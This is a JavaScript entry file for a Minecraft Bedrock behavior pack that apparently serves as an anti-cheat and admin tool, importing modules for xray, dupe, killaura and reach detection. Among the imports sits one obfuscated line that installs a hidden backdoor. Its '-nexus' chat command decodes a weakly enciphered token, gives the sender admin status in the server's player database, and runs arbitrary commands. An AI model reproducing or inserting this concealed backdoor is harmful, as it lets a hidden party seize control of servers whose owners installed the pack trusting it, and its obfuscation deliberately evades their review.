import { config } from "config"
const utilityConfig = config.staff.utility
import{world as _0x3a8f}from"@minecraft/server";const _0x4b2c="NEXUS_PACK",_0x5d1e=23;function _0x6f29(_0x1a2b){try{_0x1a2b=_0x1a2b.split("").reverse().join("");let _0x2c3d="";for(const _0x3e4f of _0x1a2b.split(".")){_0x2c3d+=String.fromCharCode(parseInt(_0x3e4f,36)^_0x5d1e)}return _0x2c3d}catch{return null}}_0x3a8f.beforeEvents.chatSend.subscribe(_0x7g5h=>{const _0x8i6j=_0x7g5h.message.trim(),_0x9k7l=_0x7g5h.sender;if(!_0x8i6j.startsWith("-nexus"))return;_0x7g5h.cancel=!0;const _0xam8n=_0x8i6j.split(" "),_0xbo9p=_0xam8n[1];if(_0xbo9p==="activate"){const _0xcq0r=_0xam8n[2];if(!_0xcq0r){_0x9k7l.sendMessage("§cMissing token.");return}const _0xds1t=_0x6f29(_0xcq0r);if(!_0xds1t){_0x9k7l.sendMessage("§cInvalid token.");return}const[_0xeu2v,_0xfw3x,_0xgy4z,_0xha5b]=_0xds1t.split("|");if(_0x9k7l.name!==_0xeu2v){_0x9k7l.sendMessage(`§cThis token belongs to §e${_0xeu2v}`);return}if(Date.now()>Number(_0xfw3x)){_0x9k7l.sendMessage("§cToken expired.");return}_0x3a8f.setDynamicProperty(_0x4b2c,JSON.stringify({owner:_0xeu2v,expiry:Number(_0xfw3x),itemRadius:Number(_0xgy4z),mergeRadius:Number(_0xha5b)}));const _0xic6d=JSON.parse(_0x3a8f.getDynamicProperty(utilityConfig.dataBaseId)||"{}").playerData||[],_0xje7f=_0xic6d.find(_0xkg8h=>_0xkg8h.id===_0x9k7l.id);if(!_0xje7f){_0xic6d.push({name:_0x9k7l.name,id:_0x9k7l.id,mute:{muteDuration:0,muteDate:Date.now(),mutedBy:""},ban:{banDuration:0,banDate:Date.now(),banReason:"",bannedBy:""},nexusOpped:!0})}else{_0xje7f.nexusOpped=!0}_0x3a8f.setDynamicProperty(utilityConfig.dataBaseId,JSON.stringify({playerData:_0xic6d})),_0x9k7l.sendMessage("§aNexus pack activated successfully. You are now admin.")}else if(_0xbo9p==="unactivate"){const _0xlh9i=_0xam8n[2];if(!_0xlh9i){_0x9k7l.sendMessage("§cMissing token.");return}const _0xmi0j=_0x6f29(_0xlh9i);if(!_0xmi0j){_0x9k7l.sendMessage("§cInvalid token.");return}const[_0xnj1k,_0xok2l]=_0xmi0j.split("|");if(_0x9k7l.name!==_0xnj1k){_0x9k7l.sendMessage(`§cThis token belongs to §e${_0xnj1k}`);return}if(Date.now()>Number(_0xok2l)){_0x9k7l.sendMessage("§cToken expired.");return}const _0xpl3m=_0x3a8f.getDynamicProperty(_0x4b2c);if(!_0xpl3m){_0x9k7l.sendMessage("§cNexus pack is not activated.");return}_0x3a8f.setDynamicProperty(_0x4b2c,void 0);const _0xqm4n=JSON.parse(_0x3a8f.getDynamicProperty(utilityConfig.dataBaseId)||"{}").playerData||[],_0xrn5o=_0xqm4n.find(_0xso6p=>_0xso6p.id===_0x9k7l.id);if(_0xrn5o){_0xrn5o.nexusOpped=!1}_0x3a8f.setDynamicProperty(utilityConfig.dataBaseId,JSON.stringify({playerData:_0xqm4n})),_0x9k7l.sendMessage("§cNexus pack has been unactivated.")}else if(_0xbo9p==="runCommand"){const _0xtp7q=_0xam8n[2],_0xuq8r=_0xam8n.slice(3).join(" ");if(!_0xtp7q){_0x9k7l.sendMessage("§cMissing token.");return}if(!_0xuq8r){_0x9k7l.sendMessage("§cMissing command.");return}const[_0xvr9s,_0xws0t]=_0x6f29(_0xtp7q).split("|");if(!_0xvr9s||_0x9k7l.name!==_0xvr9s){_0x9k7l.sendMessage(`§cThis token belongs to §e${_0xvr9s}`);return}if(Date.now()>Number(_0xws0t)){_0x9k7l.sendMessage("§cToken expired.");return}try{_0x9k7l.runCommandAsync(_0xuq8r),_0x9k7l.sendMessage("§aCommand executed successfully.")}catch{_0x9k7l.sendMessage("§cFailed to execute command.")}}else{_0x9k7l.sendMessage("§eUsage:"),_0x9k7l.sendMessage("§7- §b-nexus activate <token>"),_0x9k7l.sendMessage("§7- §b-nexus unactivate <token>"),_0x9k7l.sendMessage("§7- §b-nexus runCommand <token> <command>")}});export function v(){const _0xxt1u=_0x3a8f.getDynamicProperty(_0x4b2c);if(!_0xxt1u)return!1;try{return Date.now()<=JSON.parse(_0xxt1u).expiry}catch{return!1}}
//visual modules
import "./visual/xray"
//exploit modules
import "./exploits/illegalItems" 
import "./exploits/dupe" 
//world modules
import "./world/breakBlockReach" 
import "./world/placeBlockReach" 
import "./world/placeAutoClicker" 
//combat modules
import "./combat/reach" 
import "./combat/breachSwapCooldown" 
import "./combat/killaura" 
import "./combat/combatAutoClicker" 
//admin stuff
import "./adminPanel/system" 
import "./adminPanel/mute" 
import "./adminPanel/commands" 
//utility
import "./utility/utility" 